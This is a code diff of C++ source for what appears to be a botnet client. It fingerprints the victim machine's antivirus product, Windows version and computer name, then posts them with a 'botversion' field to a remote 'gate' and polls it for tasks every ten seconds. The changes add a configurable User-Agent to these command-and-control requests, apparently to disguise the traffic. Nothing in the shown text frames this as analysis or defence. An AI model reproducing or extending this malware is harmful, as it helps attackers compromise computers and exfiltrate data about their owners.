@@ -335,7 +335,6 @@ std::string& BstrToStdString(const BSTR bstr, std::string& dst, int cp = CP_UTF8
 }
 
 std::string bstr_to_str(BSTR source) {
-	//source = L"lol2inside";
 	_bstr_t wrapped_bstr = _bstr_t(source);
 	int length = wrapped_bstr.length();
 	char* char_array = new char[length];
@@ -344,7 +343,6 @@ std::string bstr_to_str(BSTR source) {
 }
 
 std::string getCurrentAv() {
-
 	std::string returnString;
 	CoInitializeEx(0, 0);
 	CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
@@ -382,7 +380,6 @@ std::string getCurrentAv() {
 	services->Release();
 	locator->Release();
 	CoUninitialize();
-	//_getch();
 
 	return returnString;
 }
@@ -444,7 +441,7 @@ int main(int argc, char *argv[]) {
 				"&av=" + currentAV +
 				"&os=" + GetWindowsVersionString() +
 				"&botversion=" + encryptDecrypt("2.0"),
-				{ "Content-Type: application/x-www-form-urlencoded" }
+				{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 			);
 			std::string responseFromGate = responseToString(respons2e);
 			//TODO Handle Tasks Function
@@ -466,7 +463,7 @@ int main(int argc, char *argv[]) {
 					"&username=" + getComputerName() +
 					"&ps=" + started +
 					"&id=" + v[1],
-					{ "Content-Type: application/x-www-form-urlencoded" }
+					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: "+ config.useragent }
 				);
 				std::cout << started;
 			} else {
@@ -492,5 +489,4 @@ int main(int argc, char *argv[]) {
 		}
 		Sleep(10000);
 	}
-
 }
